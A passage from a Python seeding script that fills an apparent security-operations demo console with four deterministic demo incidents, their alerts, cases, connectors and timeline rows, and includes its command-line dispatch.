            f"Open case linked to {incident['key']}",
        ],
        affected_ips=[incident["src_ip"]],
        affected_hosts=[incident["host"]],
        affected_users=[incident["user"]],
        raw_event=raw_event,
        tags=["demo", "demo-quick", incident["key"], severity, *incident["tags"]],
        event_time=when,
        first_seen=when,
        last_seen=when,
        created_at=when,
        updated_at=when,
    )


def _demo_quick_make_case(
    tenant_id: uuid.UUID,
    incident: dict,
    *,
    when: datetime,
    alert_ids: list[uuid.UUID],
) -> Case:
    """Construct a Case for a quick-mode incident with a deterministic UUID."""
    techniques = [{"id": tid, "name": _TECHNIQUE_NAMES.get(tid, tid)} for tid in incident["technique_ids"]]
    tactics = [{"id": tid, "name": _TACTIC_NAMES.get(tid, tid)} for tid in incident["tactic_ids"]]

    return Case(
        id=_demo_quick_uuid(incident["key"], "case"),
        tenant_id=tenant_id,
        case_number=incident["key"],
        title=incident["title"],
        description=incident["description"],
        status=incident["status"],
        priority=incident["severity"],
        severity=incident["severity"],
        case_type="security_incident",
        mitre_tactics=tactics,
        mitre_techniques=techniques,
        alert_ids=[str(a) for a in alert_ids],
        tags=["demo", "demo-quick", incident["severity"], *incident["tags"]],
        summary=(
            f"Demo-quick showcase {incident['key']}. "
            f"host={incident['host']} user={incident['user']} src_ip={incident['src_ip']} "
            f"techniques={','.join(incident['technique_ids'])} "
            f"connector_sources={','.join(incident['connector_sources'])}"
        ),
        created_at=when,
        updated_at=when,
    )


_DEMO_QUICK_CONNECTOR_PROFILES: dict[str, tuple[str, str]] = {
    # connector_type -> (display name, category)
    "o365": ("Microsoft 365 (M365 Activity)", "saas"),
    "email-inbox": ("Email Inbox (SMTP/IMAP gateway)", "saas"),
    "aws-cloudtrail": ("AWS CloudTrail", "cloud"),
    "aws-guardduty": ("AWS GuardDuty", "cloud"),
    "confluence-audit": ("Atlassian Confluence (audit log)", "saas"),
    "google-workspace": ("Google Workspace", "saas"),
    "crowdstrike": ("CrowdStrike Falcon", "edr"),
    "sentinelone": ("SentinelOne", "edr"),
}


async def _seed_demo_quick_connectors(
    session,
    tenant: Tenant,
    *,
    clock: datetime,
) -> int:
    """Upsert only the connectors the four DEMO-* cases reference.

    Distinct from `_seed_connectors` (which seeds a much larger catalogue
    and short-circuits if *any* connector is already present). Quick-mode
    must work even on a stack that's already been full-seeded, so we upsert
    by (tenant_id, connector_type) instead of bulk-inserting.
    """
    needed: set[str] = set()
    for incident in _DEMO_QUICK_INCIDENTS:
        needed.update(incident["connector_sources"])

    created = 0
    for connector_type in sorted(needed):
        existing = await session.execute(
            select(Connector).where(Connector.tenant_id == tenant.id).where(Connector.connector_type == connector_type).limit(1)
        )
        if existing.scalar_one_or_none() is not None:
            continue
        display, category = _DEMO_QUICK_CONNECTOR_PROFILES.get(connector_type, (connector_type, "siem"))
        session.add(
            Connector(
                id=_demo_quick_uuid("connector", connector_type),
                tenant_id=tenant.id,
                name=display,
                connector_type=connector_type,
                category=category,
                status="healthy",
                # Deterministic 90 seconds before the clock so the "last
                # sync" badge stays static across reseeds.
                last_sync_at=clock - timedelta(seconds=90),
                created_at=clock,
                updated_at=clock,
                config={"demo_quick": True},
            )
        )
        created += 1
    await session.flush()
    return created


async def _purge_demo_quick(session, tenant: Tenant) -> tuple[int, int, int]:
    """Wipe any existing DEMO-* cases/alerts/timelines for this tenant.

    Idempotency for `--demo-quick`. Returns (cases, alerts, timelines)
    deleted so the run log is honest about what was reset.
    """
    keys = [incident["key"] for incident in _DEMO_QUICK_INCIDENTS]

    # Collect existing case IDs first so we can scope the timeline delete.
    case_rows = await session.execute(select(Case.id).where(Case.tenant_id == tenant.id).where(Case.case_number.in_(keys)))
    case_ids = [row[0] for row in case_rows.all()]

    deleted_timelines = 0
    if case_ids:
        result = await session.execute(
            delete(CaseTimeline).where(CaseTimeline.tenant_id == tenant.id).where(CaseTimeline.case_id.in_(case_ids))
        )
        deleted_timelines = result.rowcount or 0

    # Drop alerts owned by these cases. Alerts also carry the demo-quick
    # tag, but case-scoped deletion is the safer ON DELETE path.
    deleted_alerts = 0
    if case_ids:
        result = await session.execute(delete(Alert).where(Alert.tenant_id == tenant.id).where(Alert.case_id.in_(case_ids)))
        deleted_alerts = result.rowcount or 0

    deleted_cases = 0
    if case_ids:
        result = await session.execute(delete(Case).where(Case.tenant_id == tenant.id).where(Case.id.in_(case_ids)))
        deleted_cases = result.rowcount or 0

    await session.flush()
    return deleted_cases, deleted_alerts, deleted_timelines


async def _seed_demo_quick(
    session,
    tenant: Tenant,
    *,
    clock: datetime,
) -> tuple[int, int, int]:
    """Insert the four DEMO-* cases with deterministic data.

    Returns ``(cases, alerts, timelines)``. Caller is expected to have
    purged any prior DEMO-* rows via `_purge_demo_quick`.
    """
    new_alerts: list[Alert] = []
    new_cases: list[Case] = []
    timeline_rows: list[CaseTimeline] = []

    # Stagger case creation so the queue order is stable: DEMO-001 oldest,
    # DEMO-004 (ransomware) newest — that's the case the screencast lands on.
    for index, incident in enumerate(_DEMO_QUICK_INCIDENTS):
        minutes_ago = (len(_DEMO_QUICK_INCIDENTS) - index) * 6
        case_when = clock - timedelta(minutes=minutes_ago)

        incident_alerts: list[Alert] = []
        for alert_offset, alert_spec in enumerate(incident["alerts"]):
            alert_when = case_when + timedelta(minutes=alert_offset * 2 - 3)
            alert = _demo_quick_make_alert(
                tenant.id,
                incident,
                alert_offset,
                alert_spec,
                when=alert_when,
            )
            incident_alerts.append(alert)
        session.add_all(incident_alerts)
        new_alerts.extend(incident_alerts)

        case = _demo_quick_make_case(
            tenant.id,
            incident,
            when=case_when,
            alert_ids=[a.id for a in incident_alerts],
        )
        session.add(case)
        new_cases.append(case)

        for alert in incident_alerts:
            alert.case_id = case.id

        timeline_rows.append(
            CaseTimeline(
                id=_demo_quick_uuid(incident["key"], "timeline", "created"),
                case_id=case.id,
                tenant_id=case.tenant_id,
                event_type="created",
                content=(
                    f"Demo case opened from {len(incident_alerts)} correlated alert(s) "
                    f"(source: {', '.join(incident['connector_sources'])})."
                ),
                event_metadata={
                    "actor": "alert-fusion",
                    "incident_key": incident["key"],
                    "demo_quick": True,
                    "connector_sources": incident["connector_sources"],
                    "alerts": [str(a.id) for a in incident_alerts],
                },
                is_automated=True,
                created_at=case_when,
            )
        )

    session.add_all(timeline_rows)
    await session.flush()
    return len(new_cases), len(new_alerts), len(timeline_rows)


# ─── Mode dispatch ─────────────────────────────────────────────────────────────


def _build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="python -m app.scripts.seed_demo",
        description=(
            "Seed the AiSOC demo dataset. With no flags this populates the full "
            "BOTS-shaped catalogue (15 INC-RT-* + 28 randomized). With "
            "--demo-quick it populates exactly four deterministic DEMO-* "
            "incidents for the `pnpm aisoc:demo --quick` / screencast path."
        ),
    )
    p.add_argument(
        "--demo-quick",
        action="store_true",
        help=(
            "Seed only the four canonical DEMO-NNN cases (phishing, cloud "
            "takeover, insider exfil, ransomware) with a fixed clock for a "
            "deterministic <4-minute demo run."
        ),
    )
    p.add_argument(
        "--clock",
        type=str,
        default=None,
        help=(
            "Wall-clock to anchor --demo-quick timestamps to (ISO-8601). "
            "Defaults to the canonical T6.4 screencast clock so re-runs are "
            "byte-stable. Ignored without --demo-quick."
        ),
    )
    return p


async def _run_full_seed() -> None:
    print("[seed] connecting to database…", flush=True)
    async with AsyncSessionLocal() as session:
        try:
            tenant = await _ensure_tenant(session)
            user = await _ensure_user(session, tenant)
            new_connectors = await _seed_connectors(session, tenant)
            new_alerts, new_cases = await _seed_alerts_and_cases(session, tenant)
            realistic_alerts, realistic_cases, playbook_runs = await _seed_realistic_incidents(session, tenant)
            in_flight_runs = await _seed_in_flight_investigation(session, tenant)
            mirrored = await _mirror_cases_to_aisoc(session, tenant)
            await session.commit()
        except Exception:
            await session.rollback()
            raise

    print(f"[seed] tenant: {tenant.id} ({tenant.slug})")
    print(f"[seed] user: {user.email} (role={user.role})")
    print(f"[seed] connectors created: {new_connectors}")
    print(f"[seed] alerts created: {new_alerts}")
    print(f"[seed] cases created: {new_cases}")
    print(f"[seed] realistic incidents — alerts: {realistic_alerts}, cases: {realistic_cases}, playbook runs: {playbook_runs}")
    print(f"[seed] in-flight investigations: {in_flight_runs}")
    print(f"[seed] cases mirrored to aisoc_cases: {mirrored}")
    print("[seed] done — log into the console at http://localhost:3000")


async def _run_quick_seed(clock: datetime) -> None:
    print(f"[seed] --demo-quick mode (clock={clock.isoformat()})", flush=True)
    async with AsyncSessionLocal() as session:
        try:
            tenant = await _ensure_tenant(session)
            user = await _ensure_user(session, tenant)
            connectors = await _seed_demo_quick_connectors(session, tenant, clock=clock)
            deleted_cases, deleted_alerts, deleted_timelines = await _purge_demo_quick(session, tenant)
            cases, alerts, timelines = await _seed_demo_quick(session, tenant, clock=clock)
            await session.commit()
        except Exception:
            await session.rollback()
            raise

    print(f"[seed] tenant: {tenant.id} ({tenant.slug})")
    print(f"[seed] user: {user.email} (role={user.role})")
    print(f"[seed] connectors upserted: {connectors}")
    print("[seed] purged DEMO-* — cases:%d alerts:%d timelines:%d" % (deleted_cases, deleted_alerts, deleted_timelines))
    print(f"[seed] DEMO-* cases seeded: {cases}")
    print(f"[seed] DEMO-* alerts seeded: {alerts}")
    print(f"[seed] DEMO-* timelines seeded: {timelines}")
    print("[seed] showcase case: DEMO-004 — http://localhost:3000/cases/DEMO-004?tab=ledger")
    print("[seed] done — four-case demo set is live")


async def _main_async(args: argparse.Namespace) -> None:
    if args.demo_quick:
        await _run_quick_seed(clock=_parse_clock(args.clock))
    else:
        await _run_full_seed()


def main(argv: list[str] | None = None) -> None:
    # `parse_known_args` is intentional — `app.scripts.demo_seed` (the
    # hosted-demo wrapper) imports this `main` and calls it without
    # forwarding its own argparse vector, so `sys.argv` may contain
    # wrapper-only flags like `--reset` / `--kickoff-investigation`.
    # Silently ignoring unknown tokens keeps that path working without
    # having to coordinate two argparse surfaces.
    args, _unknown = _build_arg_parser().parse_known_args(argv)
    asyncio.run(_main_async(args))


if __name__ == "__main__":
    # Allow `python -m app.scripts.seed_demo` from the api service container.
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
    except Exception as exc:  # pragma: no cover - operational helper
        print(f"[seed] failed: {exc}", file=sys.stderr)
        sys.exit(1)
